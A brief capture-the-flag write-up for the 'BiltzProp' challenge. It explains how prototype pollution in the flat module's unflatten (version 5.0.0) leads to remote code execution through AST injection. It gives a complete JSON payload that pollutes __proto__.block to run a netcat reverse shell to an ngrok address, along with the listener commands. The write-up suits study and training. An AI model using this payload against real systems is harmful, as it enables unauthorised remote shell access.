# BiltzProp

This challenge contained a Prototype Pollution to RCE via AST Injection.

In the `challenge/routes/index.js` file, we can see the usage of `unflatten` function from `flat` module in the processing of post data of endpoint `/api/submit`. Then from the `package.json` file we can see the `flat` module installed version is `5.0.0` which suffers from a Prototype Pollution vulnerability.

Refer [this](https://blog.p6.is/AST-Injection/) blog post for detailed explanation of this vulnerability.

To exploit this vulnerability and get the flag, we can execute the code(reverse shell) through the POST call "/api/submit". To get request for reverse shell, we can use ngrok to get a public DN and start listening on a port -

```sh
nc -nvlp 36636
```

```sh
ngrok tcp 36636
```

POST call body -

```json
{
	"song.name": "Not Polluting with the boys",
	"__proto__.block": {
		"type": "Text",
		"line": "process.mainModule.require('child_process').execSync(`nc -v <ngrok-DN> <ngrok-port> -e /bin/sh`)"
	}
}
```


Then we get the access to the shell in terminal tab which is listening on the port. Then we can execute command to view the flag file.
